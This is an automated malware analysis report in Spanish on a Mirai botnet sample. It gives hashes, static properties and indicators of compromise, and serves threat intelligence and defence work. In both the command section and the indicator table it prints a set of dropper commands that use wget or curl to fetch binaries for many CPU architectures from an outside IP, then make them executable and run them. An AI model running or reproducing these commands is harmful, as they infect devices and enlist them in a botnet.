# 🧬 Payload Analysis

`5d2836ede22331f6aa0fd17fda3afc56cd1bfe8f956a80a4f6ab35cdeb69b2fb`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asociaron 24 comandos observados o extraídos.

## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:48:36+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5d2836ede22331f6aa0fd17fda3afc56cd1bfe8f956a80a4f6ab35cdeb69b2fb`
- **SHA1:** `7e2e5ee46b3764c7de4f0bcb2fe3485f15d8bcb3`
- **MD5:** `dd23a78038252821c07d0bc562c1cee7`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.28 |
| Strings | 44 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl;
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_
busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRR
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRR
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRR
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRR
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRii
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRii
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRii
curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRii
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 94.154.43.XXX | static_analysis |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/ | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; | strings |
| url | hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; | strings |
| hash | 5d2836ede22331f6aa0fd17fda3afc56cd1bfe8f956a80a4f6ab35cdeb69b2fb | static_analysis |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_ | strings |
| command | busybox wget hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./ | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/ | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRR | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRR | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRR | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRR | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRii | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRii | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRii | strings |
| command | curl hxxp://94.154.43.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRii | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
